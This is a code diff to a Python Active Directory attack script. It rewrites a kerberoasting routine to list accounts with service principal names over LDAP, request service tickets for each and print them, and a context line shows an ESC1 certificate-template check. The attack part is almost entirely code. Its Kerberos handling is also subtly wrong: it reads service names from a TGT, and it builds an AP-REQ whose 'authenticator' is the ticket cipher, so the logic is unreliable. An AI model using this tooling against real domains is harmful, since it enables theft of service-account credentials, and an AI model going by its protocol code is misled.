@@ -45,44 +45,29 @@ def ldap_auth(username, password, domain, dc_ip):
         print(f"Error during LDAP authentication: {e}")
         return None
 
-def kerberoast(domain, username, password, dc_ip):
+def find_kerberoastable_accounts(domain, dc_ip):
     try:
-        print(f"Attempting to Kerberoast accounts from {dc_ip}")
+        print("Searching for kerberoastable accounts...")
 
-        # Get TGT ticket for the specified user
-        _, krbtgt_ticket = kerberos_auth(username, password, domain, dc_ip)
+        # Connect to the Domain Controller via LDAP
+        server = ldap3.Server(dc_ip)
+        conn = ldap3.Connection(server, auto_bind=True)
 
-        if krbtgt_ticket:
-            print("Successfully obtained krbtgt ticket.")
-            
-            # Extract usernames of kerberoastable accounts from the TGT
-            kerberoastable_accounts = extract_kerberoastable_accounts(krbtgt_ticket)
-            if kerberoastable_accounts:
-                print("Kerberoastable Accounts:")
-                for account in kerberoastable_accounts:
-                    print(account)
-            else:
-                print("No kerberoastable accounts found.")
-        else:
-            print("Failed to obtain krbtgt ticket.")
+        # Search for kerberoastable accounts
+        conn.search(search_base=domain,
+                    search_filter="(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))",
+                    search_scope=ldap3.SUBTREE,
+                    attributes=['sAMAccountName'])
 
-    except Exception as e:
-        print(f"Error while Kerberoasting: {e}")
+        # Retrieve kerberoastable account names
+        kerberoastable_accounts = [entry['attributes']['sAMAccountName'] for entry in conn.entries]
 
-def extract_kerberoastable_accounts(tgt):
-    try:
-        kerberoastable_accounts = []
-
-        for ticket in tgt['enc-part']['cipher'].tickets:
-            sname = str(ticket['sname'])
-            if sname.startswith('service'):
-                service_name = sname.split('/')[1].split('@')[0]
-                kerberoastable_accounts.append(service_name)
+        print(f"Found {len(kerberoastable_accounts)} kerberoastable accounts.")
 
         return kerberoastable_accounts
 
     except Exception as e:
-        print(f"Error while extracting kerberoastable accounts: {e}")
+        print(f"Error while searching for kerberoastable accounts: {e}")
         return []
 
 def check_esc1_certificate_templates(domain, username, password, dc_ip):
@@ -102,6 +87,68 @@ def check_esc1_certificate_templates(domain, username, password, dc_ip):
 
     except Exception as e:
         print(f"Error while checking ESC1 certificate templates: {e}")
+
+def kerberoast(domain, username, password, dc_ip):
+    try:
+        print(f"Attempting to Kerberoast accounts from {dc_ip}")
+
+        # Get TGT ticket for the specified user
+        ccache, krbtgt = kerberos_auth(username, password, domain, dc_ip)
+
+        if krbtgt:
+            print("Successfully obtained krbtgt ticket.")
+            
+            # Find kerberoastable accounts and request service tickets
+            kerberoastable_accounts = find_kerberoastable_accounts(domain, dc_ip)
+            if kerberoastable_accounts:
+                print("Kerberoastable Accounts:")
+                for account in kerberoastable_accounts:
+                    print(account)
+                    # Request service ticket for the kerberoastable account
+                    service_ticket = request_service_ticket(ccache, krbtgt, account)
+                    if service_ticket:
+                        print("Service ticket obtained.")
+                        print(service_ticket)
+                    else:
+                        print("Failed to obtain service ticket.")
+            else:
+                print("No kerberoastable accounts found.")
+        else:
+            print("Failed to obtain krbtgt ticket.")
+
+    except Exception as e:
+        print(f"Error while Kerberoasting: {e}")
+
+def request_service_ticket(ccache, krbtgt, target_user):
+    # Request service ticket for the target user
+    try:
+        # Build the AP-REQ request
+        ap_req = AP_REQ()
+        ap_req['pvno'] = 5
+        ap_req['msg-type'] = constants.ApplicationTagNumbers.AP_REQ.value
+        ap_req['ap-options'] = constants.GSS_C_MUTUAL_FLAG | constants.GSS_C_SEQUENCE_FLAG
+        ap_req['ticket'] = krbtgt['ticket']
+        ap_req['authenticator'] = types.EncryptedData()
+
+        # Build the Authenticator
+        authenticator = types.EncryptedData()
+        authenticator['etype'] = krbtgt['ticket']['enc-part']['etype']
+        authenticator['cipher'] = krbtgt['ticket']['enc-part']['cipher']
+
+        # Set the target user principal
+        target_principal = Principal(target_user, type=constants.PrincipalNameType.NT_PRINCIPAL)
+
+        # Pack the AP-REQ request
+        ap_req_data = ap_req.getData()
+
+        # Send the AP-REQ request to the KDC and get the service ticket
+        service_ticket = ccache.getKerberosTicket(ap_req_data, target_principal)
+
+        return service_ticket
+
+    except Exception as e:
+        print(f"Error while requesting service ticket: {e}")
+        return None
 
 
 # Example usage:
